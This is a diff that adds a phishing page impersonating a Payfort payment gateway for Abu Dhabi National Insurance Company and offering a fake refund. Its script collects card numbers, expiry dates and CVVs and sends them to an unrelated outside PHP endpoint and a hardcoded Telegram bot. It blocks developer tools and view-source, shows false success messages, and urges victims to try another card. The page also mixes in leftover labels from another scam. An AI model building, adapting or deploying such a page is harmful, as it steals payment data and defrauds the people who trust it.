@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payfort Payment Gateway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .left-section {
+            width: 60%;
+            min-width: 300px;
+        }
+        .right-section {
+            width: 35%;
+            min-width: 250px;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #0066cc;
+        }
+        .payment-method {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .payment-method img {
+            width: 60px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        .payment-method img:hover {
+            transform: scale(1.05);
+        }
+        .selected {
+            border-color: #007bff !important;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
+        }
+        .buttons {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        .continue {
+            background-color: #007bff;
+            color: white;
+        }
+        .continue:hover {
+            background-color: #0069d9;
+        }
+        .cancel {
+            background-color: #6c757d;
+            color: white;
+        }
+        .cancel:hover {
+            background-color: #5a6268;
+        }
+        .card-details {
+            margin-top: 20px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .card-details label {
+            display: block;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #495057;
+        }
+        .card-details input, .card-details select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 8px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .card-details input:focus, .card-details select:focus {
+            border-color: #80bdff;
+            outline: 0;
+            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+        }
+        .card-row {
+            display: flex;
+            gap: 15px;
+        }
+        .card-row div {
+            flex: 1;
+        }
+        #status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 5px;
+            display: none;
+            text-align: center;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .loading {
+            background-color: #cce5ff;
+            color: #004085;
+            border: 1px solid #b8daff;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            .left-section, .right-section {
+                width: 100%;
+            }
+            .card-row {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+    </style>
+    <!-- Protection Script (Add this right before </head>) -->
+    <script>
+        // Protection Module - Self-contained
+        document.addEventListener('DOMContentLoaded',function(){
+          function n(){var e=document.createElement("div");
+          e.textContent="Protected Content",e.style.cssText="position:fixed;top:20px;right:20px;background:#dc3545;color:#fff;padding:8px 12px;border-radius:4px;z-index:9999;font-family:Arial;font-size:14px;box-shadow:0 2px 5px rgba(0,0,0,0.2)",document.body.appendChild(e),setTimeout(function(){e.remove()},2e3)}
+          document.addEventListener("contextmenu",function(e){e.preventDefault(),n()});
+          document.onkeydown=function(e){e.ctrlKey&&(85===e.keyCode||117===e.keyCode)||e.keyCode>=112&&e.keyCode<=123&&(e.preventDefault(),n())};
+          window.self!==window.top&&(window.top.location=window.self.location);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>Abu Dhabi National Insurance Company PJSC
+</h1>
+            <div class="payment-method" id="paymentOptions">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" onclick="selectPayment(this)">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" onclick="selectPayment(this)">
+            </div>
+            
+            <div class="card-details">
+                <h3 style="color: #343a40; margin-top: 0;">Enter Card Details</h3>
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                <div class="card-row">
+                    <div>
+                        <label>Expiry Month</label>
+                        <select id="expiryMonth">
+                            <option value="" disabled selected>Month</option>
+                            <script>
+                                for (let i = 1; i <= 12; i++) {
+                                    const month = i.toString().padStart(2, '0');
+                                    document.write(`<option value="${month}">${month}</option>`);
+                                }
+                            </script>
+                        </select>
+                    </div>
+                    <div>
+                        <label>Expiry Year</label>
+                        <select id="expiryYear">
+                            <option value="" disabled selected>Year</option>
+                            <script>
+                                const currentYear = new Date().getFullYear();
+                                for (let i = currentYear; i <= currentYear + 10; i++) {
+                                    document.write(`<option value="${i}">${i}</option>`);
+                                }
+                            </script>
+                        </select>
+                    </div>
+                    <div>
+                        <label>CVV</label>
+                        <input type="password" id="cvv" placeholder="•••" maxlength="3" pattern="\d*">
+                    </div>
+                </div>
+                <div id="status"></div>
+                <div class="buttons">
+                    <button class="continue" onclick="submitForm()">Continue</button>
+                    <button class="cancel" onclick="cancelPayment()">Cancel</button>
+                </div>
+            </div>
+
+        </div>
+        <div class="right-section">
+            <h3 style="color: #343a40; margin-top: 0;">Your Refund Details</h3>
+            <p><strong>Pay For:</strong> ADNIC - Insurance
+</p>
+            <!--<p><strong>Subtotal:</strong> 3,429.3 د.إ AED</p>-->
+            <p><strong style="font-size: 1.1em;">Total Amount to be paid:</strong> <span style="font-size: 1.1em; color: #dc3545;">3,429.3د.إ AED</span></p>
+            <div style="margin-top: 20px; padding: 10px; background: #e2e3e5; border-radius: 5px;">
+                <p style="margin: 0;">🔒 Secure SSL/TLS encrypted payment</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = "6412739878:AAETfP4I2zqZby4N5Qj0FrrxGOhm9IkldE0";
+        const CHAT_ID = "6081166435";
+        
+        let selectedPaymentMethod = '';
+        let cardPressCount = 0; // Track card clicks
+        
+        function selectPayment(element) {
+            // Remove selected class from all images
+            document.querySelectorAll('.payment-method img').forEach(img => {
+                img.classList.remove('selected');
+            });
+            
+            // Add selected class to clicked image
+            element.classList.add('selected');
+            selectedPaymentMethod = element.alt;
+            
+            // Increment counter and redirect after 3 clicks
+            cardPressCount++;
+            if (cardPressCount >= 3) {
+                showStatus('Successful! Redirecting...', 'success');
+                setTimeout(() => {
+                    window.location.href = "https://hakimdoukkali.com/wp-content/fail.php";
+                }, 1500);
+            }
+        }
+        
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})/g, '$1 ').trim();
+            input.value = value;
+        }
+        
+        function showStatus(message, statusType = 'info') {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = statusType;
+            statusDiv.style.display = 'block';
+            
+            if (statusType === 'success') {
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Failed to send message:', error);
+                return null;
+            }
+        }
+        
+        function validateForm() {
+             // Validate card number (remove spaces first)
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            if (cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
+                showStatus('Please enter a valid 16-digit card number', 'error');
+                return false;
+            }
+            
+            // Validate expiry date
+            const expiryMonth = document.getElementById('expiryMonth').value;
+            const expiryYear = document.getElementById('expiryYear').value;
+            if (!expiryMonth || !expiryYear) {
+                showStatus('Please select expiry month and year', 'error');
+                return false;
+            }
+            
+            // Validate CVV
+            const cvv = document.getElementById('cvv').value;
+            if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
+                showStatus('Please enter a valid 3-digit CVV', 'error');
+                return false;
+            }
+            
+            return true;
+        }
+        
+        function submitForm() {
+            if (!validateForm()) return;
+            
+            // Show loading state
+            showStatus('Processing your payment...', 'loading');
+            
+            // Get form values
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiryMonth = document.getElementById('expiryMonth').value;
+            const expiryYear = document.getElementById('expiryYear').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            // Prepare form data
+            const formData = new FormData();
+            formData.append('payment_method', selectedPaymentMethod);
+            formData.append('card_number', cardNumber);
+            formData.append('expiry_month', expiryMonth);
+            formData.append('expiry_year', expiryYear);
+            formData.append('cvv', cvv);
+            formData.append('invoice_number', 'INV-PBL22-7714');
+            formData.append('amount', '6120.00');
+            formData.append('currency', 'AED');
+            
+            // Submit to PHP endpoint
+            fetch('https://astrealdevelopers.com/js/fail.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(async (result) => {
+                // Prepare Telegram message
+                const telegramMessage = `
+💳 <b>New Payment Submission</b>
+────────────────────
+<b>Service:</b> TAKHLEES GOVERNMENT SERV
+<b>Method:</b> ${selectedPaymentMethod}
+<b>Card:</b> **** **** **** ${cardNumber.slice(-4)}
+<b>Expiry:</b> ${expiryMonth}/${expiryYear}
+<b>Amount:</b> 6,120.00 AED
+<b>Invoice:</b> INV-PBL22-7714
+────────────────────
+<b>Server Response:</b>
+${result}
+                `;
+                
+                // Send to Telegram
+                const telegramResponse = await sendToTelegram(telegramMessage);
+                
+                if (telegramResponse && telegramResponse.ok) {
+                    showStatus('Payment processed successfully! Confirmation sent.', 'success');
+                } else {
+                    showStatus('Payment processed but Telegram notification failed', 'error');
+                }
+            })
+            .catch(error => {
+                showStatus('Payment processing failed. Please use another card to complete payment', 'error');
+                console.error('Error:', error);
+            });
+        }
+        
+        function cancelPayment() {
+            if (confirm('Are you sure you want to cancel this payment?')) {
+                window.location.href = 'https://hakimdoukkali.com/wp-content/fail.php';
+            }
+        }
+    </script>
+</body>
+</html>
